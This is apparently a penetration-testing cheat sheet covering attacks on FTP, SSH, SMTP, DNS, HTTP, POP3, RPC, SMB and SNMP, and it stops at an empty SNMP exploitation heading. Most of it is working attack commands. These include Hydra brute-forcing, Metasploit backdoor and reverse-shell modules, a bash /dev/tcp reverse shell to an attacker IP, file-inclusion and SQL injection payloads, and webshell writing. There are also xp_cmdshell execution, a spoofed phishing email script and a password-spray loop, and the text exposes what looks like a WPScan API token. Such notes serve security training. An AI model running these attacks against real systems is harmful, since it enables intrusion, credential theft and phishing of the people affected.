## **🛡️ Network Protocols**

### Network protocols allow devices to communicate and exchange data over a network. Here’s an expanded explanation of some commonly used protocols in penetration testing:
---

<details>
<summary>1.📂 FTP (File Transfer Protocol) port 21 </summary>
 <br>   
- **Port:** 21 (TCP)
- **Function:** FTP is used for transferring files between a client and a server. FTP operates over two channels:
    - **Control channel** (for sending commands)
    - **Data channel** (for transferring the actual files).
- **Common Security Issues:**
    - **Anonymous login:** Some FTP servers are misconfigured to allow anonymous logins, providing unauthorized access to files.
    - **Clear-text credentials:** FTP sends usernames and passwords in clear text, making it vulnerable to sniffing attacks.

---

### **1.1. Penetration Testing on FTP**
FTP enumeration
```bash
ftp <IP>
#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password

put <file> #uploading file
get <file> #downloading file

#NSE
locate .nse | grep ftp
nmap -p21 --script=<name> <IP>

#bruteforce
hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa

# Check for vulnerabilities associated with the identified version.
```
![image](https://github.com/user-attachments/assets/70094f78-e27a-446e-a97f-6eb39cff347c)

---
### **1.1.1. Anonymous Login**

When performing penetration testing, an attacker can attempt to log in using **anonymous credentials** if the FTP server allows it. Many misconfigured FTP servers allow anonymous access for easier file sharing, which is a security risk.

**Example FTP login attempt:**

```bash

ftp 192.168.188.131
Name: Anonymous
Password: Anonymous

```
![image](https://github.com/user-attachments/assets/00f9a1e5-3e22-4ad2-86cc-10d990b43574)


If the server allows anonymous login, you will be able to interact with the server and explore its contents.

---

### **1.1.2. Sniffing FTP Credentials (Clear-text Passwords)**

Because FTP doesn’t encrypt traffic, usernames and passwords are sent in clear text. An attacker can use sniffing tools to capture this data, which can be used to compromise the server.

- **Wireshark:** A tool that can capture network packets and allow an attacker to see the FTP credentials.

**How to sniff credentials:**

1. **Start an FTP session**:
    
    ```bash
    
    ftp 192.168.188.131
    
    ```
    
2. **Capture the traffic using Wireshark.**
3. **Follow the TCP stream** to see the credentials:
    - Look for packets containing the string `"PASS"` in Wireshark, which indicates the password being sent.

**Filter clear-text credentials:**

```
frame contains "PASS"
```
![image](https://github.com/user-attachments/assets/84ba48da-79ce-4da8-89d0-0158d5ee9db2)

---

### **1.1.3. FTP Brute-Force Attack (Hydra)**

**Hydra** is a popular tool for performing brute-force attacks against various services, including FTP. It can attempt multiple combinations of usernames and passwords to gain unauthorized access.

**Example of brute-forcing FTP login:**

```bash

hydra -L user -P pass 192.168.188.131 ftp
hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp
use: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <ip> ftp

```

- **L** specifies a file with usernames.
- **P** specifies a file with passwords.
- **ftp** is the target protocol.

The **wordlist** file contains a list of possible usernames or passwords to be tried. A strong wordlist (such as **rockyou.txt**) increases the chance of success.
![image](https://github.com/user-attachments/assets/eafa1572-24ac-4ef1-93bd-6734b79ad5e0)

---

### **1.1.4. FTP Remote Shell via Nmap Script**

You can also use **Nmap** to exploit specific vulnerabilities in FTP servers. The `ftp-vsftpd-backdoor.nse` script is designed to exploit a vulnerability in **vsFTPd 2.3.4**, which contains a backdoor.

**Example Nmap command to check for the backdoor:**

```bash

sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse

```

This will test if the FTP server is vulnerable to the **vsFTPd backdoor**. If the server is vulnerable, you may be able to execute commands remotely.
![image](https://github.com/user-attachments/assets/48113953-c487-4bfa-bf04-49b376c60901)

---

### **1.1.5. Exploiting FTP Vulnerabilities with Metasploit**

Metasploit is another powerful tool used for exploiting vulnerabilities in systems. If the FTP server is running a vulnerable version of vsFTPd (e.g., **vsFTPd 2.3.4**), Metasploit can be used to exploit it.

**Steps to exploit vsFTPd 2.3.4 with Metasploit:**

1. **Search for the exploit:**
    
    ```bash
    
    msfconsole
    search vsftpd 2.3.4
    
    ```
    
2. **Use the exploit:**
    
    ```bash
  
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST 192.168.188.131
    exploit
    
    ```
    
3. **Interact with the remote shell:**
    
    ```bash
   
    python -c 'import pty; pty.spawn("/bin/bash")'
    
    ```
    

By exploiting this vulnerability, you can get access to the **root** account on the target machine.
![image](https://github.com/user-attachments/assets/2c266ec1-e757-4442-970e-cc713e589347)

</details> 

<details>
 
<summary>2.🔒 SSH (Secure Shell) port 22 </summary>
 <br>
**Secure Shell (SSH)** is a cryptographic network protocol designed for secure communication over an unsecured network. It is primarily used for remote login and command-line execution, replacing older, less secure protocols like Telnet and rlogin
https://www.ssh.com/academy/ssh/public-key-authentication

https://docs.github.com/en/authentication/connecting-to-github-with-ssh/about-ssh

## SSH enumeration


#Login

    ssh uname@IP #enter the password in the prompt

#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for the password, crack it using John

**Enumerating SSH authentication method
The SSH authentication method can be enumerated by using the ssh-auth-methods script in nmap, the username can be given using the –script-args flag. The following command can be used to enumerate the authentication method used:

    nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 <ip>
#cracking id_rsa or id_ecdsa

     ssh2john id_ecdsa(or)id_rsa > hash
     john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

bruteforce
Since the authentication is password based hence the service can be brute forced against a username and password dictionary using hydra to find the correct username and password. After creating a username dictionary as users.txt and password dictionary as pass.txt, the following command can be used:

    hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice versa
    hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<ip>

**Nmap SSH brute-force script

    nmap --script ssh-brute -p 22 <ip>
# Check for vulnerabilities associated with the identified version.

Use full commands:
- `t rsa`: Specifies the RSA algorithm.
- `b 4096`: Specifies the key length (4096 bits is recommended).
- You can also use `b 2048` for a shorter key length.
- **Follow the prompts:**
- Enter the path to save the key (default is `~/.ssh/id_rsa`).
- Enter a passphrase for the private key (optional but recommended for security).
- You'll have a public key (`~/.ssh/id_rsa.pub`) and a private key (`~/.ssh/id_rsa`).

### Authentication using Metasploit

An alternate way to perform the above procedure could be done by using the Metasploit module. The exploit multi/ssh/sshexec can be used to authenticate into the SSH service. Here we are assuming that the attacker has compromised the username and password already. Following will be the commands inside the Metasploit:

    use exploit/multi/ssh/sshexec
    set rhosts 192.168.31.205
    set payload linux/x86/meterpreter/reverse_tcp
    set username pentest
    set password 123
    show targets
    set target 1
    exploit

###Key based authentication (Metasploit)

The above procedure can also be performed using the Metasploit framework. The auxiliary/scanner/ssh/ssh_login_pubkey can be used to authenticate via key.

Following options can be given as configurations to run the auxiliary/scanner:

    use auxiliary/scanner/ssh/ssh_login_pubkey
    set rhosts 192.168.31.205
    set key_path /root/Downloads/ssh/id_rsa
    set key_pass 123
    set username pentest
    exploit
**while performing the brute force using hydra, the updated port needs to be given. Hence, the new command will be:

    hydra -L users.txt -P pass.txt <ip> ssh -s 2222
<img width="749" height="232" alt="image" src="https://github.com/user-attachments/assets/1aeefe88-7835-4718-857f-1107a5bb211a" />


**2. Copy the Public Key to the Server:**

Use the ssh-copy-id command.

Code

```jsx
    ssh-copy-id -i ~/.ssh/id_rsa.pub user@server_ip_or_hostname
```

- Replace `user` with your username on the server.
- Replace `server_ip_or_hostname` with the server's IP address or hostname.
- **Alternatively, manually copy the public key:**
- Read the contents of `~/.ssh/id_rsa.pub`.
- SSH into the server.
- Create the directory `~/.ssh` if it doesn't exist.
- Create or edit the file `~/.ssh/authorized_keys`.
- Append the contents of your public key to the `authorized_keys` file.
- Change the permissions of `~/.ssh` to `700` and `authorized_keys` to `600`.

Code

```jsx
    mkdir -p ~/.ssh    chmod 700 ~/.ssh   
    touch ~/.ssh/authorized_keys    
    chmod 600 ~/.ssh/authorized_keys    
    cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```

**3. Log in with the Private Key:**

- **Open your terminal**: on your local machine.
- Use the `ssh` command with the `i` option:
  ```jsx
  ssh -i ~/.ssh/id_rsa user@server_ip_or_hostname
  ssh -oHostKeyAlgorithms=+ssh-rsa TCM@10.10.81.58 -p22
  ```
  ![image](https://github.com/user-attachments/assets/bdb18c28-6296-4013-bd28-4d6edafd81e9)

**LAB**

🔍 1. Scan the Target with Nmap
You used Nmap to detect open ports, services, and versions on the target machine:

       nmap -sV -A -Pn -p22 192.168.188.131
![image](https://github.com/user-attachments/assets/0c302403-7c3a-43ba-8ae1-07e071f8290d)
identified OpenSSH 4.7p1

🌐 2. Search for Exploits
A quick Google search led to a publicly available exploit on GitHub.
![image](https://github.com/user-attachments/assets/5c3d0256-140d-496c-9a9d-659eee20cc72)

📥 3. Download the Exploit
You cloned the exploit repository using:

    git clone https://github.com/sec-jarial/OpenSSH_4.7p1-Exploit.git
    cd OpenSSH_4.7p1-Exploit

 
🐍 4. Fix Script Error: Bad Interpreter
When running the script:
 
    ./openssh_4.7p1.py                
    zsh: ./openssh_4.7p1.py: bad interpreter: /usr/bin/python3^M: no such file or directory

 ![image](https://github.com/user-attachments/assets/665777b1-d68e-4932-a420-ee61d5bd2a19)

✅ Fix: Convert Line Endings
The error indicates Windows-style line endings (CRLF). Fix it using:

    dos2unix openssh_4.7p1.py
Or, use a text editor (e.g., VS Code, Vim) to convert to LF.

🐍 5. Set the Correct Python Interpreter
Ensure the shebang (#!) at the top of the script points to your actual Python binary:

    #!/usr/bin/env python3
Replace the shebang accordingly.
Specify Correct Python Path: 

    #!/home/kali/path/to/venv/bin/python

![image](https://github.com/user-attachments/assets/19748c1f-cdd1-4297-88b6-e87a7104d17b)

▶️ 6. Run the Exploit
Now the script should execute without interpreter errors:

    ./openssh_4.7p1.py

![image](https://github.com/user-attachments/assets/e1e593d4-99f6-43cd-af6e-a231c1fcfb9d)

Result: Got the SSH shell

![image](https://github.com/user-attachments/assets/31ed8b76-ded9-427e-9850-9d19cf7f7ee7)


</details>
<details>
 <summary>3. SMTP (Simple Mail Transfer Protocol) port 25</summary>
 <br>
What is SMTP?
SMTP is the Simple Mail Transfer Protocol used to send emails between mail servers. It typically listens on port 25, though ports 587 (submission) and 465 (SMTPS) are also common.

Misconfigurations in SMTP servers—such as open relays, authentication bypass, or exposed user verification commands (VRFY/EXPN)—can be exploited to enumerate users, send spoofed phishing emails, or relay attacks.

🔎 ENUMERATING SMTP
🧪 Manual Banner Grabbing
bash

    nc -nv <IP> 25
Useful commands in the SMTP session:

smtp

    EHLO attacker.com
    VRFY root
    EXPN admin
    RCPT TO:test@target.com
Common responses:

250 OK → valid
550 User unknown → invalid
252 Cannot VRFY user → unverified (could be valid)

🛠 Tools for User Enumeration
✅ smtp-user-enum
Supports VRFY, RCPT, and EXPN modes.

bash

    smtp-user-enum -M VRFY -U users.txt -t <IP>
Other modes:

-M RCPT (works even if VRFY is disabled)
-M EXPN (useful if aliases/mailing lists are configured)

✅ Metasploit
bash

    use auxiliary/scanner/smtp/smtp_enum
    set RHOSTS <IP>
    set RPORT 25
    set USER_FILE users.txt
    run
✅ iSMTP (Kali Tool)
Test for enumeration, spoofing, and relay support.

bash

    ismtp -h <IP>:25 -e email_list.txt
✅ nmap Script
bash

    nmap -p 25 --script smtp-enum-users <IP>
💣 Exploiting Open Relay
An Open Relay allows unauthenticated users to send mail to external domains—ideal for phishing or spamming.

✅ Manual via Telnet
bash

    telnet <IP> 25
    HELO attacker.com
    MAIL FROM: attacker@attacker.com
    RCPT TO: victim@externaldomain.com
    DATA
    Subject: Test Message

    This is a test message.
    .
If 250 OK is received after RCPT TO, the server is likely an open relay.

✅ Nmap Open Relay Check
bash

    nmap -p 25 --script smtp-open-relay <IP>
📤 Sending Emails (Phishing / Spoofing)
✅ Using swaks
swaks is a powerful SMTP tester and spam/phish simulation tool.

bash

    swaks --to victim@target.com --from admin@target.com --server <IP> \--header "Subject: Update Required" --body @body.txt \--attach @file.pdf --auth LOGIN --auth-user attacker --auth-password password
Also works without auth on open relays:

bash

    swaks --to victim@target.com --from ceo@target.com --server <IP> --data "Subject: Urgent Action\nClick here"
🛠 ALTERNATIVE TOOLS
Tool	Purpose
smtp-user-enum	Bruteforce usernames via SMTP responses
swaks	Send test/phishing emails via SMTP
nmap smtp- scripts*	Banner grabbing, enum, relay checks
Metasploit smtp_enum	VRFY/EXPN-based user brute-force
iSMTP	Enumeration and spoofing test
smtp-cli	Lightweight mail-sender (can spoof headers)
Python + smtplib	Custom phishing or payload delivery scripts

🧪 Python Script Example (Spoofed Email)
python

    import smtplib
    from email.message import EmailMessage

    msg = EmailMessage()
    msg.set_content("This is a phishing test.")
    msg['Subject'] = 'Urgent Action Required'
    msg['From'] = 'admin@company.com'
    msg['To'] = 'victim@company.com'

    server = smtplib.SMTP('<IP>', 25)
    server.send_message(msg)
    server.quit()
🛡️ Mitigation Tips
❌ Disable VRFY and EXPN commands (or return generic error like 252)

❌ Disable open relay (ensure relay is restricted to known internal IPs)

✅ Use SMTP AUTH and TLS for submission

✅ Monitor SMTP logs for brute-force attempts or external relays

✅ Apply SPF, DKIM, and DMARC to prevent spoofing

📚 Real-World Use Cases
🎣 Phishing Campaigns – Sending fake internal alerts or staged payloads

🕵️ Internal Recon – Validating usernames before brute-forcing SMB/WinRM

🧠 Password Spray – Combining usernames from SMTP enumeration in other protocols (SMB, HTTP, WinRM, etc.)

</details>

<details>
<summary>4. DNS (Domain Name System) port 53</summary>
 <br>
- Better use `Seclists` wordlists for better enumeration. https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

```
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com

for ip in $(cat list.txt); do host $ip.megacorpone.com; done #DNS Bruteforce
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash bruteforcer to find domain name

## DNS Recon
dnsrecon -d megacorpone.com -t std #standard recon
dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list

# DNS Bruteforce using dnsenum
dnsenum megacorpone.com

## NSlookup, a gold mine
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful
```
</details>

<details>
<summary>5. HTTP/S (Hypertext Transfer Protocol) port 80, 443</summary>
 <br>
- View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
- Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
- check /robots.txt folder
- Look for the hostname and add the relevant one to `/etc/hosts` file.
- Directory and file discovery - Obtain any hidden files that may contain juicy information

```
dirbuster
dirb http://<ip> /usr/share/seclists/Discovery/Web-Content/raft-medium-words -R
gobuster dir -u http://example.com -w /path/to/wordlist.txt
python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
```

- Vulnerability Scanning using nikto: `nikto -h <url>`
- `HTTPS`SSL certificate inspection, may reveal information like subdomains, usernames…etc
- Default credentials: Identify the CMS or service, check for default credentials, and test them out.
- Bruteforce

```
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.

#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
```

- if `cgi-bin` is present, then do further fuzzing and obtain files like .sh or .pl
- Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.
- API - Fuzz further, and it can reveal some sensitive information

```
#identifying endpoints using gobuster
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything

#obtaining info using curl
curl -i http://192.168.50.16:5002/users/v1
```

- If there is any Input field check for **Remote Code execution** or **SQL Injection**
- Check the URL, whether we can leverage **Local or Remote File Inclusion**.
- Also check if there’s any file upload utility(also obtain the location it’s getting reflected)

**Wordpress**

```
# basic usage
wpscan --url "target" --verbose

# enumerate vulnerable plugins, users, vulnerable themes, timthumbs
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log

# Add Wpscan API to get the details of vulnerabilties.
wpscan --url http://alvida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA

#Accessing Wordpress shell
http://10.10.67.245/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro

http://10.10.67.245/retro/wp-content/themes/90s-retro/404.php
```

**Drupal**

```
droopescan scan drupal -u http://site
```

**Joomla**

```
droopescan scan joomla --url http://site
sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce
```
### **Web Attacks**

💡 Cross-platform PHP revershell: [

https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php))

**Directory Traversal**

```
cat /etc/passwd #displaying content through absolute path
cat ../../../etc/passwd #relative path

# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
cat ../../etc/passwd

#In web int should be exploited like this, find a parameters and test it out
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
#check for id_rsa, id_ecdsa
#If the output is not getting formatted properly then,
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd

#For windows
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt #no need to provide drive
```

- URL Encoding

```
#Sometimes it doesn't show if we try path, then we need to encode them
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

- Wordpress
    - Simple exploit: https://github.com/leonjza/wordpress-shell

**Local File Inclusion**

- The main difference between Directory traversal and this attack is that we can execute commands remotely here.

```
#At first we need
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here

#Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #encoded version of above reverse-shell

#PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
```

- Remote file inclusion

```
1. Obtain a php shell
2. host a file server
3.
http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
we can also host a php reverseshell and obtain shell.
```

**SQL Injection**

```
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

- Blind SQL Injection - This can be identified by Time-based SQLI

```
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

- Manual Code Execution

```
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#Sometimes we may not have direct access to convert it to RCE from the web, then follow the below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
```

- SQLMap - Automated Code Execution

```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database

#OS Shell
#  Obtain the Post request from Burp suite and save it to post.txt
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there

```
</details>

<details>
<summary>6. POP3 (Post Office Protocol Version 3) port 110</summary>
 <br>
**Post Office Protocol** \(**POP**\) is a type of computer networking and Internet standard **protocol** that extracts and retrieves email from a remote mail server for access by the host machine. **POP** is an application layer **protocol** in the OSI model that provides end users the ability to fetch and receive email \(from [here](https://www.techopedia.com/definition/5383/post-office-protocol-pop)\).

The POP clients generally connect, retrieve all messages, store them on the client system, and delete them from the server. There are 3 versions of POP, but POP3 is the most used one.

**Default ports:** 110, 995\(ssl\)

```text
PORT    STATE SERVICE
110/tcp open  pop3
```

## Enumeration

### Banner Grabbing

```bash
nc -nv <IP> 110
openssl s_client -connect <IP>:995 -crlf -quiet
```

## Manual

You can use the command `CAPA` to obtain the capabilities of the POP3 server.

## Automated

```bash
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts
```

The `pop3-ntlm-info` plugin will return some "**sensitive**" data \(Windows versions\).

### [POP3 bruteforce](../brute-force.md#pop)

## POP syntax

```bash
POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities
```

From [here](http://sunnyoasis.com/services/emailviatelnet.html)

Example:

```text
root@kali:~# telnet $ip 110
 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
 USER billydean    
 +OK
 PASS password
 +OK Welcome billydean

 list

 +OK 2 1807
 1 786
 2 1021

 retr 1

 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login for remote desktop ... try not to forget it this time!
 username: billydean
 password: PA$$W0RD!Z
```

```

### Identifying Issues

- Clear-text authentication (no SSL/TLS).
- Weak credentials (try common usernames/passwords).
- Default or anonymous access.

### Exploiting

```bash

# Manual login attempt
telnet <IP> 110
USER <username>
PASS <password>

# Hydra brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 110 -vV <IP> pop3

```

### References

- HackTricks - POP3
- POP3 RFC 1939
</details>



<details>
<summary>7.🔌 RPC (Remote Procedure Call) port 111 </summary>
 <br>
RPC allows a program on one computer to execute a procedure on another computer.

**Enumerating with RPCClient:**
**Connect to RPC server with an anonymous bind:**
```bash

$ rpcclient -U "" -N <target>
srvinfo
enumdomusers #Enumerate Domain Users
enumpriv #like "whoami /priv"
queryuser <user> #detailed user info
getuserdompwinfo <RID> #password policy, get user-RID from previous command
getdompwinfo #Get Domain Password Info
lookupnames <user> #SID of specified user
createdomuser <username> #Creating a user
deletedomuser <username>
enumdomains
enumdomgroups # Enumerate Domain Groups
querygroup <group-RID> #get rid from previous command
querydispinfo #description of all users
querygroupmem 0x200 #Query Group Membership
netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
netshareenumall
lsaenumsid #SID of all users

```

This will provide information about the target system and its users.
![image](https://github.com/user-attachments/assets/1a5d498c-8a6d-4a91-b017-69b62a6cb5e2)

“RID are relative identifier to identify an object which will be in hexa decimal format”

![image](https://github.com/user-attachments/assets/d3e9af35-e0b2-4c72-b893-e7a24141b82a)

**Password Spray Attack**

The following script will iterate over usernames and passwords and try to execute "getusername". Watch out for "ACCOUNT_LOCKED" error messages.

```
TARGET=10.10.10.10;
while read username; do
  while read password; do
    echo -n "[*] user: $username" && rpcclient -U "$username%$password" -c "getusername;quit" $TARGET | grep -v "NT_STATUS_ACCESS_DENIED";
  done < /path/to/passwords.txt
done < /path/to/usernames.txt
```

If a password is found, use it with smbclient to explore the SYSVOL:

```
$ smbclient -U "username%password" \\\\<target>\\SYSVOL
Domain=[HOME] OS=[Windows Server 2008]
...
smb: \> ls
...
```
---
</details>

<details>
<summary>8.🗂️ SMB (Server Message Block) port 139,445</summary>
 <br>
SMB is a protocol used for file and printer sharing, as well as inter-process communication between computers.

**Example Nmap command to scan for SMB services:**

```bash

sudo nmap -p 445 -sV -sC 192.168.188.131
locate .nse | grep smb
nmap -p445 --script="name" $IP 

```
![image](https://github.com/user-attachments/assets/5f4b1ffc-baab-4de5-9c0f-dcb520401b1c)


**Enumerating SMB Shares:**

```bash
#In windows we can view like this
net view \\<computername/IP> /all

enum4linux -L -S 192.168.188.131
smbclient -L 192.168.188.131 -N
smbmap -H 192.168.188.131
#If you got user name and password:
smbmap -H 192.168.188.131 -u "msfadmin" -p "msfadmin" -r tmp -A '.*' -q

```

**Brute-forcing SMB credentials:**

```bash

hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131
or
netexec smb 192.168.188.131 -u admin -p /home/kali/pass.txt --continue-on-success

```
![image](https://github.com/user-attachments/assets/c592d34d-613f-49b5-9a92-c3b8c951958a)
```bash
# Smbclient
smbclient -L //IP #or try with 4 /'s
smbclient //server/share
smbclient //server/share -U <username>
smbclient //server/share -U domain/username

#SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

#Within SMB session
put <file> #to upload file
get <file> #to download file
```
Downloading shares is easy—if the folder consists of several files, they will all be downloaded by this.
```bash
mask ""
recurse ON
prompt OFF
mget *
```
**Exploit SMB:**
Try to connect with no pass

```jsx
smbclient --no-pass //192.168.188.131/tmp
```

login as Anonymous:

![image](https://github.com/user-attachments/assets/1e13a6c6-3293-4bf3-a01e-bb3303698da0)


since we have smb access i tried:
```jsx
put rev.sh
posix 
chmod +x rev.sh
chown Anonymous rev.sh
open rev.sh
```
But didnt work:
Failed to open file /rev.sh. NT_STATUS_ACCESS_DENIED
![image](https://github.com/user-attachments/assets/4a71afb8-42f0-471e-bebb-bc7bc0a83107)

SMB Version Samba 3.0.20 found, search for exploits:
```bash
searchsploit samba 3.0.20  
locate multiple/remote/10095.txt
cat /usr/share/exploitdb/exploits/multiple/remote/10095.txt
```
![image](https://github.com/user-attachments/assets/6603e3bd-03ea-4424-8d4c-f3aac3acdd52)

</details>
<details>
<summary>9.📡 SNMP (Simple Network Management Protocol) port UDP 161</summary>
 <br>
What is SNMP?
Simple Network Management Protocol (SNMP) is used to manage and monitor networked devices (routers, switches, printers, servers, etc.). It typically runs over UDP port 161 for general communication and UDP port 162 for traps.
SNMP is used to manage and monitor network devices. It can be exploited if the community string is weak or known (like **public** or **private**).
![image](https://github.com/user-attachments/assets/c4d02453-3331-4739-bf58-f38aea7a6133)
Devices expose information using MIBs (Management Information Base).

SNMP is stateless and supports versions v1, v2c, and v3:

v1/v2c are widely used but insecure (community strings are in plaintext).

v3 adds encryption and authentication.

🧭 Enumeration Techniques
1. Port Scanning
bash

       nmap -sU -p 161,162 <target-ip>
-sU: Scan UDP ports
-p: Specify SNMP ports (161 for queries, 162 for traps)

2. snmpwalk
bash

       snmpwalk -v1 -c public <target-ip>
Use -v2c or -v3 as needed.

Common community strings: public, private, manager.

Useful OIDs:
1.3.6.1.2.1.1.5.0 – Hostname

1.3.6.1.2.1.25.1.6.0 – System processes

1.3.6.1.2.1.25.4.2.1.2 – Running processes

1.3.6.1.4.1 – Vendor-specific MIBs


**Example SNMP enumeration with `snmpcheck`:**

```bash

snmpcheck -c public -h 192.168.188.131
snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports

#Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports

```
if community string was public try to connect with snmpcheck
![image](https://github.com/user-attachments/assets/1eef5dc1-7a3e-40e9-9b37-ce2bfea237d9)

try to use snmp walk
![image](https://github.com/user-attachments/assets/3a136368-a50b-4fb4-a7dd-63d72ed69358)

**Brute-forcing SNMP community strings:**

```bash

onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156
or
snmpwalk -v1 -c public 192.168.146.156 NET-SNMP-EXTEND-MIB :: nsExtendObjects

```

3. snmpset (Active interaction)
bash

       snmpset -v1 -c private <target-ip> iso.3.6.1.2.1.1.5.0 s "hacked"
Requires write access (via private community string).

4. Dump Output to File
bash

       snmpwalk -v1 -c public <target-ip> > snmpout.txt
gedit snmpout.txt
5. SNMP-check
bash

     snmp-check -p 161 -c public <target-ip>
Provides a human-readable summary of SNMP results.

6. Braa (High-speed SNMP scanner)
bash

       braa public@<target-ip>:.1.3.6.*
Mass SNMP scanning tool, lightweight, does not rely on Net-SNMP libs.

🧨 Exploitation & Brute Force
